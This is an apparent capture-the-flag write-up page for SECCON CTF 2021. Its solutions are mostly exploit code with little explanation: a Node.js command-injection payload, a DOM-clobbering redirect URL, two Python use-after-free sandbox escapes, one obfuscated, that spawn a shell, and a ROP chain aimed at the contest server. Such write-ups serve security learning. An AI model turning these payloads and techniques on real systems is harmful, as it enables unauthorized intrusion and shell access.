<!DOCTYPE HTML>
<!-- This page is modified from the template https://www.codeply.com/go/7XYosZ7VH5 by Carol Skelly (@iatek). -->
<html>
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <title>SECCON CTF 2021</title>
    <link type="text/css" rel="stylesheet" href="../assets/css/github-markdown.css">
    <link type="text/css" rel="stylesheet" href="../assets/css/pilcrow.css">
    <link type="text/css" rel="stylesheet" href="../assets/css/hljs-github.min.css"/>
    <link type="text/css" rel="stylesheet" href="../assets/css/bootstrap-4.0.0-beta.3.min.css">
    <script type="text/javascript" src="../assets/js/jquery-3.3.1.slim.min.js"></script>
    <script type="text/javascript" src="../assets/js/bootstrap-4.0.0-beta.3.min.js"></script>
    <script type="text/javascript" src="../assets/js/popper-1.14.3.min.js"></script>
    <script type="text/javascript" src="../assets/js/mathjax-2.7.4/MathJax.js?config=TeX-MML-AM_CHTML"></script>
  </head>
  <style>
  body {
      padding-top: 56px;
  }

  .sticky-offset {
      top: 56px;
  }

  #body-row {
      margin-left:0;
      margin-right:0;
  }
  #sidebar-container {
      min-height: 100vh;   
      background-color: #333;
      padding: 0;
  }

  /* Sidebar sizes when expanded and expanded */
  .sidebar-expanded {
      width: 230px;
  }
  .sidebar-collapsed {
      width: 60px;
  }

  /* Menu item*/
  #sidebar-container .list-group a {
      height: 50px;
      color: white;
  }

  /* Submenu item*/
  #sidebar-container .list-group .sidebar-submenu a {
      height: 45px;
      padding-left: 60px;
  }
  .sidebar-submenu {
      font-size: 0.9rem;
  }

  /* Separators */
  .sidebar-separator-title {
      background-color: #333;
      height: 35px;
  }
  .sidebar-separator {
      background-color: #333;
      height: 25px;
  }
  .logo-separator {
      background-color: #333;    
      height: 60px;
  }


  /* 
   active scrollspy
  */
  .list-group-item.active {
    border-color: transparent;
    border-left: #e69138 solid 4px;
  }

  /* 
   anchor padding top
   https://stackoverflow.com/a/28824157
  */
  :target:before {
    content:"";
    display:block;
    height:56px; /* fixed header height*/
    margin:-56px 0 0; /* negative fixed header height */
  }
  </style>
  
  <script>
  // https://stackoverflow.com/a/48330533
  $(window).on('activate.bs.scrollspy', function (event) {
    let active_collapse = $($('.list-group-item.active').parents()[0]);
    $(".collapse").removeClass("show");
    active_collapse.addClass("show");

    let parent_menu = $('a[href="#' + active_collapse[0].id + '"]');
    $('a[href^="#submenu"]').css("border-left", "");
    parent_menu.css("border-left","#e69138 solid 4px");
  });

  // http://docs.mathjax.org/en/latest/tex.html#tex-and-latex-math-delimiters
  MathJax.Hub.Config({
    tex2jax: {
      inlineMath: [['$','$'], ['\\(','\\)']],
      processEscapes: true
    }
  });
  </script>

  <body style="position: relative;" data-spy="scroll" data-target=".sidebar-submenu" data-offset="70">
    <nav class="navbar navbar-expand-md navbar-light bg-light fixed-top">
      <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarNavDropdown" aria-controls="navbarNavDropdown" aria-expanded="false" aria-label="Toggle navigation">
        <span class="navbar-toggler-icon"></span>
      </button>
      <a class="navbar-brand" href="https://github.com/balsn/ctf_writeup">
        <img src="https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png" class="d-inline-block align-top" alt="" width="30" height="30">
        <span class="menu-collapsed">balsn / ctf_writeup</span>
      </a>
      <div class="collapse navbar-collapse" id="navbarNavDropdown">
        <ul class="navbar-nav my-2 my-lg-0">
            
            <li class="nav-item dropdown d-sm-block d-md-none">
              <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=watch&count=true&size=large&v=2" frameborder="0" scrolling="0" width="140px" height="30px"></iframe>
              <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=star&count=true&size=large" frameborder="0" scrolling="0" width="140px" height="30px"></iframe>
        
              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                web
              </a>
              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
                                <a class="dropdown-item" href="#vulnerabilities">vulnerabilities</a>
    
                <a class="dropdown-item" href="#sequence-as-a-service-1--2">sequence-as-a-service-1--2</a>
    
                <a class="dropdown-item" href="#cookie-spinner">cookie-spinner</a>
    
              </div>
            </li>
    
            <li class="nav-item dropdown d-sm-block d-md-none">
              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                pwn
              </a>
              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
                                <a class="dropdown-item" href="#seccontree">seccontree</a>
    
                <a class="dropdown-item" href="#gosubof">gosubof</a>
    
                <a class="dropdown-item" href="#pyast64pwn">pyast64pwn</a>
    
                <a class="dropdown-item" href="#kone_gadget">kone_gadget</a>
    
              </div>
            </li>
    
            <li class="nav-item dropdown d-sm-block d-md-none">
              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                reverse
              </a>
              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
                                <a class="dropdown-item" href="#pyast64rev">pyast64rev</a>
    
                <a class="dropdown-item" href="#flag">flag</a>
    
                <a class="dropdown-item" href="#sed-programming">sed-programming</a>
    
              </div>
            </li>
    
            <li class="nav-item dropdown d-sm-block d-md-none">
              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                crypto
              </a>
              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
                                <a class="dropdown-item" href="#sign-wars">sign-wars</a>
    
                <a class="dropdown-item" href="#oooooo">oooooo</a>
    
                <a class="dropdown-item" href="#cerberus">cerberus</a>
    
                <a class="dropdown-item" href="#xxx">xxx</a>
    
              </div>
            </li>
    
            <li class="nav-item dropdown d-sm-block d-md-none">
              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                misc
              </a>
              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
                
              </div>
            </li>
    
        </ul>
      </div>
      <div class="navbar-collapse collapse w-100 order-3 dual-collapse2">
        <ul class="navbar-nav ml-auto">
          <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=watch&count=true&size=large&v=2" frameborder="0" scrolling="0" width="160px" height="30px"></iframe>
          <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=star&count=true&size=large" frameborder="0" scrolling="0" width="160px" height="30px"></iframe>
        </ul>
      </div>
    </nav>
    <div class="row" id="body-row">
      <div id="sidebar-container" class="sidebar-expanded d-none d-md-block col-2">
        <ul class="list-group sticky-top sticky-offset">
          
          <a href="#submenu0" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
              <span class="fa fa-dashboard fa-fw mr-3"></span>
              <span class="menu-collapsed">web</span>
              <span class="submenu-icon ml-auto"></span>
            </div>
          </a>
          <div id="submenu0" class="collapse sidebar-submenu">
            <a href="#vulnerabilities" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">vulnerabilities</span>
            </a>
    
<a href="#sequence-as-a-service-1--2" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">sequence-as-a-service-1--2</span>
            </a>
    
<a href="#cookie-spinner" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">cookie-spinner</span>
            </a>
    
          </div>
    
          <a href="#submenu1" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
              <span class="fa fa-dashboard fa-fw mr-3"></span>
              <span class="menu-collapsed">pwn</span>
              <span class="submenu-icon ml-auto"></span>
            </div>
          </a>
          <div id="submenu1" class="collapse sidebar-submenu">
            <a href="#seccontree" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">seccontree</span>
            </a>
    
<a href="#gosubof" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">gosubof</span>
            </a>
    
<a href="#pyast64pwn" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">pyast64pwn</span>
            </a>
    
<a href="#kone_gadget" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">kone_gadget</span>
            </a>
    
          </div>
    
          <a href="#submenu2" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
              <span class="fa fa-dashboard fa-fw mr-3"></span>
              <span class="menu-collapsed">reverse</span>
              <span class="submenu-icon ml-auto"></span>
            </div>
          </a>
          <div id="submenu2" class="collapse sidebar-submenu">
            <a href="#pyast64rev" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">pyast64rev</span>
            </a>
    
<a href="#flag" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">flag</span>
            </a>
    
<a href="#sed-programming" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">sed-programming</span>
            </a>
    
          </div>
    
          <a href="#submenu3" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
              <span class="fa fa-dashboard fa-fw mr-3"></span>
              <span class="menu-collapsed">crypto</span>
              <span class="submenu-icon ml-auto"></span>
            </div>
          </a>
          <div id="submenu3" class="collapse sidebar-submenu">
            <a href="#sign-wars" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">sign-wars</span>
            </a>
    
<a href="#oooooo" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">oooooo</span>
            </a>
    
<a href="#cerberus" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">cerberus</span>
            </a>
    
<a href="#xxx" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">xxx</span>
            </a>
    
          </div>
    
          <a href="#submenu4" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
              <span class="fa fa-dashboard fa-fw mr-3"></span>
              <span class="menu-collapsed">misc</span>
              <span class="submenu-icon ml-auto"></span>
            </div>
          </a>
          <div id="submenu4" class="collapse sidebar-submenu">
            
          </div>
    
        </ul>
      </div>
      <div class="col-10 py-3">
        <article class="markdown-body"><h1 id="seccon-ctf-2021"><a class="header-link" href="#seccon-ctf-2021"></a>SECCON CTF 2021</h1>

<h2 id="web"><a class="header-link" href="#web"></a>Web</h2>
<h3 id="vulnerabilities"><a class="header-link" href="#vulnerabilities"></a>Vulnerabilities</h3>
<h3 id="sequence-as-a-service-1--2"><a class="header-link" href="#sequence-as-a-service-1--2"></a>Sequence as a Service 1 &amp; 2</h3>
<pre class="hljs"><code><span class="hljs-regexp">/api/g</span>etValue?sequence=(<span class="hljs-keyword">call</span>,x)=&gt;([<span class="hljs-string">&quot;\\&quot;</span>,<span class="hljs-string">&quot;]-require(&#x27;child_process&#x27;).execSync(&#x27;id&#x27;)}))//&quot;</span>])&amp;n=<span class="hljs-number">1</span>
</code></pre><h3 id="cookie-spinner"><a class="header-link" href="#cookie-spinner"></a>Cookie Spinner</h3>
<pre class="hljs"><code>http://web:3000/?window=ownerDocument&amp;view=<span class="hljs-tag">&lt;<span class="hljs-name">object</span> <span class="hljs-attr">id</span>=<span class="hljs-string">ownerDocument</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">object</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">id</span>=<span class="hljs-string">ownerDocument</span> <span class="hljs-attr">name</span>=<span class="hljs-string">location</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;http://ginoah.tw&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></code></pre><h2 id="pwn"><a class="header-link" href="#pwn"></a>Pwn</h2>
<h3 id="seccontree"><a class="header-link" href="#seccontree"></a>SecconTree</h3>
<h4 id="uaf--sandbox-escape"><a class="header-link" href="#uaf--sandbox-escape"></a>UAF + sandbox escape</h4>
<pre class="hljs"><code>typ = dbg.__class__.__class__
<span class="hljs-built_in">str</span> = typ(<span class="hljs-string">&#x27;&#x27;</span>)
<span class="hljs-built_in">int</span> = typ(<span class="hljs-number">0</span>)
<span class="hljs-built_in">tuple</span> = typ(())
<span class="hljs-built_in">bytes</span> = typ(<span class="hljs-string">b&#x27;&#x27;</span>)
<span class="hljs-built_in">bytearray</span> = typ(dbg.Bytearray(<span class="hljs-number">0</span>))


tree_addr = dbg.Id(Tree)

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">p64</span>(<span class="hljs-params">x</span>):</span> <span class="hljs-keyword">return</span> x.to_bytes(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;little&#x27;</span>)

outer = <span class="hljs-string">b&#x27;&#x27;</span>.join([
    p64(<span class="hljs-number">1</span>), p64(dbg.Id(<span class="hljs-built_in">bytearray</span>)),
    p64(<span class="hljs-number">0x0ffffffffffffffe</span>), p64(<span class="hljs-number">0x0fffffffffffffff</span>),
    p64(<span class="hljs-number">0x0</span>), p64(<span class="hljs-number">0x0</span>),
])

oaddr = dbg.Id(outer)
dbg.Print(<span class="hljs-string">f&#x27;0x<span class="hljs-subst">{oaddr:08x}</span>&#x27;</span>)

buf = p64(<span class="hljs-number">1</span>) + p64(tree_addr) + p64(oaddr+<span class="hljs-number">0x20</span>) + p64(<span class="hljs-number">0</span>)


y_obj = typ(<span class="hljs-string">&#x27;Y&#x27;</span>, (), {<span class="hljs-string">&#x27;__repr__&#x27;</span>: <span class="hljs-keyword">lambda</span> x: <span class="hljs-string">&#x27;victim&#x27;</span>})

x = Tree(<span class="hljs-string">&#x27;root&#x27;</span>)
z = Tree(<span class="hljs-string">&#x27;repl&#x27;</span>)

y = y_obj()
y = Tree(y)
x.add_child_left(y)
<span class="hljs-keyword">del</span> y
y = <span class="hljs-literal">None</span>

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">callback</span>(<span class="hljs-params">_</span>):</span>
    dbg.Print(<span class="hljs-string">&#x27;triggered&#x27;</span>)
    x.add_child_left(z)

hook_str = typ(<span class="hljs-string">&#x27;Hook&#x27;</span>, (<span class="hljs-built_in">str</span>,), {<span class="hljs-string">&#x27;__del__&#x27;</span>: callback})
hook_obj = typ(<span class="hljs-string">&#x27;Hook&#x27;</span>, (), {<span class="hljs-string">&#x27;__repr__&#x27;</span>: <span class="hljs-keyword">lambda</span> x: hook_str(<span class="hljs-string">&quot;victim&quot;</span>)})
hook = hook_obj()

uaf = x.find(hook)
yaddr = dbg.Id(uaf)
dbg.Print(<span class="hljs-string">f&#x27;0x<span class="hljs-subst">{yaddr:08x}</span>&#x27;</span>)

rawuaf = dbg.Bytearray(buf)
dbg.Print(uaf)
mem = uaf.get_object()
dbg.Print(mem[tree_addr:tree_addr+<span class="hljs-number">0x10</span>])

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get</span>(<span class="hljs-params">x</span>):</span>
    rawuaf[<span class="hljs-number">16</span>:<span class="hljs-number">24</span>] = p64(x)
    <span class="hljs-keyword">return</span> uaf.get_object()

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">deref</span>(<span class="hljs-params">x</span>):</span>
    <span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>.from_bytes(mem[x:x+<span class="hljs-number">8</span>], <span class="hljs-string">&#x27;little&#x27;</span>)

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">wr</span>(<span class="hljs-params">x, v</span>):</span>
    mem[x:x+<span class="hljs-number">8</span>] = v.to_bytes(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;little&#x27;</span>)

cmd = <span class="hljs-string">&#x27;&#x27;&#x27;
echo pwned
bash --login
&#x27;&#x27;&#x27;</span>

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">func</span>():</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> ().__dmbtt__.__cbtft__[<span class="hljs-number">0</span>].__tvcdmbttft__():
        <span class="hljs-keyword">try</span>:
            i.__joju__.__hmpcbmt__.hfu(<span class="hljs-string">&#x27;sy&#x27;</span>+<span class="hljs-string">&#x27;s&#x27;</span>).npevmft[<span class="hljs-string">&#x27;o&#x27;</span>+<span class="hljs-string">&#x27;s&#x27;</span>].tztufn(dne)
            <span class="hljs-keyword">break</span>
        <span class="hljs-keyword">except</span>:
            <span class="hljs-keyword">pass</span>

tab = {<span class="hljs-string">&#x27;b&#x27;</span>: <span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;c&#x27;</span>: <span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-string">&#x27;d&#x27;</span>: <span class="hljs-string">&#x27;c&#x27;</span>, <span class="hljs-string">&#x27;e&#x27;</span>: <span class="hljs-string">&#x27;d&#x27;</span>, <span class="hljs-string">&#x27;f&#x27;</span>: <span class="hljs-string">&#x27;e&#x27;</span>, <span class="hljs-string">&#x27;g&#x27;</span>: <span class="hljs-string">&#x27;f&#x27;</span>, <span class="hljs-string">&#x27;h&#x27;</span>: <span class="hljs-string">&#x27;g&#x27;</span>, <span class="hljs-string">&#x27;i&#x27;</span>: <span class="hljs-string">&#x27;h&#x27;</span>, <span class="hljs-string">&#x27;j&#x27;</span>: <span class="hljs-string">&#x27;i&#x27;</span>, <span class="hljs-string">&#x27;k&#x27;</span>: <span class="hljs-string">&#x27;j&#x27;</span>, <span class="hljs-string">&#x27;l&#x27;</span>: <span class="hljs-string">&#x27;k&#x27;</span>, <span class="hljs-string">&#x27;m&#x27;</span>: <span class="hljs-string">&#x27;l&#x27;</span>, <span class="hljs-string">&#x27;n&#x27;</span>: <span class="hljs-string">&#x27;m&#x27;</span>, <span class="hljs-string">&#x27;o&#x27;</span>: <span class="hljs-string">&#x27;n&#x27;</span>, <span class="hljs-string">&#x27;p&#x27;</span>: <span class="hljs-string">&#x27;o&#x27;</span>, <span class="hljs-string">&#x27;q&#x27;</span>: <span class="hljs-string">&#x27;p&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>: <span class="hljs-string">&#x27;q&#x27;</span>, <span class="hljs-string">&#x27;s&#x27;</span>: <span class="hljs-string">&#x27;r&#x27;</span>, <span class="hljs-string">&#x27;t&#x27;</span>: <span class="hljs-string">&#x27;s&#x27;</span>, <span class="hljs-string">&#x27;u&#x27;</span>: <span class="hljs-string">&#x27;t&#x27;</span>, <span class="hljs-string">&#x27;v&#x27;</span>: <span class="hljs-string">&#x27;u&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>: <span class="hljs-string">&#x27;v&#x27;</span>, <span class="hljs-string">&#x27;x&#x27;</span>: <span class="hljs-string">&#x27;w&#x27;</span>, <span class="hljs-string">&#x27;y&#x27;</span>: <span class="hljs-string">&#x27;x&#x27;</span>, <span class="hljs-string">&#x27;z&#x27;</span>: <span class="hljs-string">&#x27;y&#x27;</span>, <span class="hljs-string">&#x27;_&#x27;</span>: <span class="hljs-string">&#x27;_&#x27;</span>}

func_addr = dbg.Id(func)
cod = get(deref(func_addr + <span class="hljs-number">0x10</span>))
names = <span class="hljs-built_in">tuple</span>(<span class="hljs-string">&#x27;&#x27;</span>.join(tab[e] <span class="hljs-keyword">for</span> e <span class="hljs-keyword">in</span> n) <span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> cod.co_names)
dbg.Print(names)
cod = cod.replace(co_names=names)
cod_addr = dbg.Id(cod)
wr(func_addr+<span class="hljs-number">0x10</span>, cod_addr)
func()</code></pre><h4 id="uaf--fake-type"><a class="header-link" href="#uaf--fake-type"></a>UAF + fake type</h4>
<pre class="hljs"><code>typ = dbg.__class__.__class__
str = typ(&#x27;&#x27;)<span class="hljs-built_in">
int </span>= typ(0)
bytearray = typ(dbg.Bytearray(0))

tree_addr = dbg.Id(Tree)

def u64(bytestring):
    num = 0
    for i in [7,6,5,4,3,2,1,0]:
        num&lt;&lt;=8
        num+=bytestring[i]
   <span class="hljs-built_in"> return </span>num

def p32(x):<span class="hljs-built_in"> return </span>x.to_bytes(4, &#x27;little&#x27;)

def p64(x):<span class="hljs-built_in"> return </span>x.to_bytes(8, &#x27;little&#x27;)

def fakePyObject_construct(ob_refcnt=0,ob_typ=0):
   <span class="hljs-built_in"> return </span>p64(ob_refcnt)+p64(ob_typ)

def fakePyVarObject_construct(PyObjectparam=(0,0),ob_size=0):
   <span class="hljs-built_in"> return </span>fakePyObject_construct(PyObjectparam[0],PyObjectparam[1])+p64(ob_size)

def fakeByteArray_construct(PyVarObjectParam=(0,0,0),ob_alloc=0,ob_addr=0,ob_start=0,ob_exports=0):
   <span class="hljs-built_in"> return </span>fakePyVarObject_construct(PyVarObjectParam[:2],PyVarObjectParam[-1])+p64(ob_alloc)+p64(ob_addr)+p64(ob_start)+p64(ob_exports)

def fakePyTypeObject_construct(PyVarObjectParam=(0,0,0),tp_name=0,tp_basicsize=0,tp_itemsize=0,tp_dealloc=0,tp_print=0,tp_getAttr=0,tp_setAttr=0,tp_as_async=0,tp_repr=0,tp_as_number=0,tp_as_sequence=0,tp_as_mapping=0,tp_hash=0,tp_call=0,tp_str=0,tp_getAttro=0,tp_setAttro=0,tp_as_buffer=0,tp_flags=0,tp_doc=0,tp_traverse=0,tp_clear=0,tp_richcompare=0,tp_weaklistoffset=0,tp_iter=0,tp_iternext=0,tp_methods=0,tp_members=0,tp_getset=0,tp_Base=0,tp_dic=0,tp_descr_get=0,tp_descr_set=0,tp_dictoffset=0,tp_init=0,tp_alloc=0,tp_new=0,tp_free=0,tp_is_gc=0,tp_Bases=0,tp_Mro=0,tp_cache=0,tp_suClasses=0,tp_weaklist=0,tp_del=0,tp_version_tag=0,tp_finalize=0):
   <span class="hljs-built_in"> return </span>fakePyVarObject_construct(PyVarObjectParam[:2],PyVarObjectParam[-1])+p64(tp_name)+p64(tp_basicsize)+p64(tp_itemsize)+p64(tp_dealloc)+p64(tp_print)+p64(tp_getAttr)+p64(tp_setAttr)+p64(tp_as_async)+p64(tp_repr)+p64(tp_as_number)+p64(tp_as_sequence)+p64(tp_as_mapping)+p64(tp_hash)+p64(tp_call)+p64(tp_str)+p64(tp_getAttro)+p64(tp_setAttro)+p64(tp_as_buffer)+p64(tp_flags)+p64(tp_doc)+p64(tp_traverse)+p64(tp_clear)+p64(tp_richcompare)+p64(tp_weaklistoffset)+p64(tp_iter)+p64(tp_iternext)+p64(tp_methods)+p64(tp_members)+p64(tp_getset)+p64(tp_Base)+p64(tp_dic)+p64(tp_descr_get)+p64(tp_descr_set)+p64(tp_dictoffset)+p64(tp_init)+p64(tp_alloc)+p64(tp_new)+p64(tp_free)+p64(tp_is_gc)+p64(tp_Bases)+p64(tp_Mro)+p64(tp_cache)+p64(tp_suClasses)+p64(tp_weaklist)+p64(tp_del)+p32(tp_version_tag)+p32(0)+p64(tp_finalize)

def fakePyMethodDef_construct(ml_name=0,ml_meth=0,ml_flags=0,ml_doc=0):
   <span class="hljs-built_in"> return </span>p64(ml_name)+p64(ml_meth)+p32(ml_flags)+p32(0)+p64(ml_doc)

outer = b&#x27;&#x27;.join([
    p64(1), p64(dbg.Id(bytearray)),
    p64(0x0ffffffffffffffe), p64(0x0fffffffffffffff),
    p64(0x0), p64(0x0),
])

oaddr = dbg.Id(outer)
dbg.Print(f&#x27;0x{oaddr:08x}&#x27;)

buf = p64(1) + p64(tree_addr) + p64(oaddr+0x20) + p64(0)


y_obj = typ(&#x27;Y&#x27;, (), {&#x27;__repr__&#x27;: lambda x: &#x27;victim&#x27;})

x = Tree(&#x27;root&#x27;)
z = Tree(&#x27;repl&#x27;)

y = y_obj()
y = Tree(y)
x.add_child_left(y)
del y
y = None

def callback(_):
    dbg.Print(&#x27;triggered&#x27;)
    x.add_child_left(z)

hook_str = typ(&#x27;Hook&#x27;, (str,), {&#x27;__del__&#x27;: callback})
hook_obj = typ(&#x27;Hook&#x27;, (), {&#x27;__repr__&#x27;: lambda x: hook_str(<span class="hljs-string">&quot;victim&quot;</span>)})
hook = hook_obj()

uaf = x.find(hook)
yaddr = dbg.Id(uaf)
dbg.Print(f&#x27;0x{yaddr:08x}&#x27;)

rawuaf = dbg.Bytearray(buf)
dbg.Print(uaf)
mem = uaf.get_object()
dbg.Print(mem[tree_addr:tree_addr+0x10])

def get(x):
    rawuaf[16:24] = p64(x)
   <span class="hljs-built_in"> return </span>uaf.get_object()

def deref(x):
   <span class="hljs-built_in"> return </span>int.from_bytes(mem[x:x+8], &#x27;little&#x27;)

def wr(x, v):
    mem[x:x+8] = v.to_bytes(8, &#x27;little&#x27;)

<span class="hljs-comment">###</span>
sy_plt = 0x4214f0


func = lambda<span class="hljs-keyword"> :0</span>
func_addr = dbg.Id(func)

cod = get(deref(func_addr + 0x10))
cod = cod.replace(co_names=())
cod_addr = dbg.Id(cod)

fakeTypeObject = fakePyTypeObject_construct(tp_getAttro=sy_plt)
fakeObject = fakePyVarObject_construct((u64(b&#x27;/bin/sh\x00&#x27;)-2,dbg.Id(fakeTypeObject)+0x20),0)

dbg.Print(dbg.Hex(dbg.Id(fakeObject)))

wr(func_addr, u64(b&#x27;/bin/sh\x00&#x27;))
wr(func_addr+0x8, dbg.Id(fakeTypeObject)-0x8)
dbg.Print(dbg.Hex(func_addr),dbg.Hex(cod_addr))
dbg.Print(&#x27;written&#x27;)
cod.Sy()</code></pre><h3 id="gosubof"><a class="header-link" href="#gosubof"></a>gosubof</h3>
<p>ROP goes brrr</p>
<pre class="hljs"><code><span class="hljs-attribute">from</span> pwn import *

<span class="hljs-comment">###Addr</span>
<span class="hljs-comment">#  libc2.31</span>
<span class="hljs-attribute">gets_plt</span> = <span class="hljs-number">0</span>x<span class="hljs-number">401040</span>
<span class="hljs-attribute">bss</span> = <span class="hljs-number">0</span>x<span class="hljs-number">404800</span>
<span class="hljs-attribute">IO_file_underflow_offset</span> = <span class="hljs-number">0</span>x<span class="hljs-number">93</span>ba<span class="hljs-number">0</span>

<span class="hljs-comment">###ROPgadget</span>
<span class="hljs-attribute">pop_rdi</span> = <span class="hljs-number">0</span>x<span class="hljs-number">4011</span>c<span class="hljs-number">3</span>
<span class="hljs-attribute">pop_rbp</span> = <span class="hljs-number">0</span>x<span class="hljs-number">40111</span>d
<span class="hljs-attribute">leave</span> = <span class="hljs-number">0</span>x<span class="hljs-number">401158</span>
<span class="hljs-attribute">set_param</span> = <span class="hljs-number">0</span>x<span class="hljs-number">4011</span>ba
<span class="hljs-attribute">call_func</span> = <span class="hljs-number">0</span>x<span class="hljs-number">4011</span>a<span class="hljs-number">0</span>
<span class="hljs-attribute">add_rbp_val_ebx</span> = <span class="hljs-number">0</span>x<span class="hljs-number">40111</span>c
<span class="hljs-attribute">one_gadget</span> = <span class="hljs-number">0</span>xe<span class="hljs-number">6</span>e<span class="hljs-number">79</span>

<span class="hljs-comment">###Exploit</span>
<span class="hljs-attribute">r</span> = remote(&#x27;hiyoko.quals.seccon.jp&#x27;,<span class="hljs-number">9002</span>)

<span class="hljs-attribute">padding</span> = b&#x27;\x<span class="hljs-number">00</span>&#x27;*<span class="hljs-number">0</span>x<span class="hljs-number">88</span>
<span class="hljs-attribute">ROPchain</span> = p<span class="hljs-number">64</span>(pop_rdi)+p<span class="hljs-number">64</span>(bss)+\
           <span class="hljs-attribute">p64</span>(gets_plt)+\
           <span class="hljs-attribute">p64</span>(pop_rbp)+p<span class="hljs-number">64</span>(bss-<span class="hljs-number">8</span>)+\
           <span class="hljs-attribute">p64</span>(leave)
<span class="hljs-attribute">payload</span> = padding+ROPchain
<span class="hljs-attribute">r</span>.sendline(payload)

<span class="hljs-attribute">ROPchain</span> = p<span class="hljs-number">64</span>(pop_rdi)+p<span class="hljs-number">64</span>(bss+<span class="hljs-number">0</span>x<span class="hljs-number">400</span>)+\
           <span class="hljs-attribute">p64</span>(gets_plt)+\
           <span class="hljs-attribute">p64</span>(set_param)+p<span class="hljs-number">64</span>(((<span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">32</span>)+one_gadget-(IO_file_underflow_offset+<span class="hljs-number">383</span>))&amp;<span class="hljs-number">0</span>xffffffff)+p<span class="hljs-number">64</span>(bss-<span class="hljs-number">0</span>x<span class="hljs-number">88</span>+<span class="hljs-number">0</span>x<span class="hljs-number">3</span>d)+p<span class="hljs-number">64</span>(<span class="hljs-number">0</span>)+p<span class="hljs-number">64</span>(<span class="hljs-number">0</span>)+p<span class="hljs-number">64</span>(<span class="hljs-number">0</span>)+p<span class="hljs-number">64</span>(<span class="hljs-number">0</span>)+\
           <span class="hljs-attribute">p64</span>(add_rbp_val_ebx)+\
           <span class="hljs-attribute">p64</span>(set_param)+p<span class="hljs-number">64</span>(<span class="hljs-number">0</span>)+p<span class="hljs-number">64</span>(bss)+p<span class="hljs-number">64</span>(<span class="hljs-number">0</span>)+p<span class="hljs-number">64</span>(<span class="hljs-number">0</span>)+p<span class="hljs-number">64</span>(<span class="hljs-number">0</span>)+p<span class="hljs-number">64</span>(bss-<span class="hljs-number">0</span>x<span class="hljs-number">88</span>)+\
           <span class="hljs-attribute">p64</span>(call_func)

<span class="hljs-attribute">r</span>.sendline(ROPchain)
<span class="hljs-attribute">sleep</span>(<span class="hljs-number">1</span>)
<span class="hljs-attribute">r</span>.sendline(&#x27;M<span class="hljs-number">30</span>W&#x27;)

